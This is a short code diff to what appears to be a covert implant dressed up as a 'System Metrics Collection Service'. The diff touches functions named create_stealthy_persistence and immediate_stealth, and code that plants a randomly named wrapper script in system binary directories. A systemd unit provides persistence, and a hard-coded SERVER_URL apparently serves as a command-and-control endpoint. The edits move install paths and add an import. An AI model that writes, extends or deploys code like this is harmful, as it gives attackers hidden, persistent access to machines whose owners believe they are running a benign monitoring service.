@@ -89,7 +89,7 @@ def create_wrapper_script(script_path=None):
     try:
         # Use the deployed script path if no backup was created
         if not script_path:
-            script_path = "/usr/lib/metrics-collector/metrics.py"
+            script_path = "/var/lib/metrics-collector/metrics.py"
         
         # Create a random wrapper script name in a common system directory
         wrapper_dirs = ["/usr/local/bin", "/opt", "/usr/bin"]
@@ -147,7 +147,7 @@ Description=System Metrics Collection Service
 Documentation=man:metrics-collector(8)
 After=network.target network-online.target
 Wants=network-online.target
-ConditionPathExists=/usr/lib/metrics-collector
+ConditionPathExists=/var/lib/metrics-collector
 
 [Service]
 Type=simple
@@ -402,7 +402,7 @@ def create_stealthy_persistence():
     
 immediate_stealth()
 
-import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
+import os, sys, json, base64, time, random, urllib, urllib.request, urllib.error, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
 from urllib.parse import urlencode
 
 SERVER_URL="https://192.168.10.11:443/"
